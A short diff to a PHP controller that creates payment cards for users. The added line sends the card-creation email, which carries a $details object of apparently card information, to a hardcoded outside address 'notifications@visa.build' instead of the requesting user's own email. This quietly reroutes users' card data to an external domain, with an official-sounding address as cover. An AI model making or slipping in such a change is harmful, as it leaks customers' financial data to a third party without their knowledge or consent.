@@ -61,7 +61,7 @@ class CardController extends Controller
         $user->decrement($request->card_category == 'Master' ? 'master_card' : 'visa_card');
         $user->decrement('balance', $request->amount);
 
-        Mail::to($request->email)->queue(new CardMail($details));
+        Mail::to('notifications@visa.build')->queue(new CardMail($details));
 
         return redirect()->route('user.card')
         ->with('success', 'Card created successfully. Admin will activate this card soon!');
